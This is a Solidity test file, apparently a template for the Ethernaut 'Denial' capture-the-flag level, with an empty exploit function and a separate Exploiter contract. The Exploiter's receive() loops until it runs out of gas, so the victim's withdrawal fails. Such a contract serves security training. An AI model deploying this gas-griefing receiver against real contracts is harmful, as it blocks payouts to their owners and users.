// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/Denial.sol";
import "src/levels/DenialFactory.sol";

contract TestDenial is BaseTest {
    Denial private level;

    constructor() public {
        // SETUP LEVEL FACTORY
        levelFactory = new DenialFactory();
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        /** CODE YOUR SETUP HERE */

        levelAddress = payable(this.createLevelInstance{value: 0.001 ether}(true));
        level = Denial(levelAddress);

        // Check that the contract is correctly setup
    }

    function exploitLevel() internal override {
        /** CODE YOUR EXPLOIT HERE */

        vm.startPrank(player, player);

        // Solve the Challenge
   
        vm.stopPrank();
    }
}

contract Exploiter {
    uint256 private sum;

    function withdraw(Denial victim) external {
        victim.withdraw();
    }

    function exploit() public {
        uint256 index;
        for (index = 0; index < uint256(-1); index++) {
            sum += 1;
        }
    }

    receive() external payable {
        exploit();
    }
}
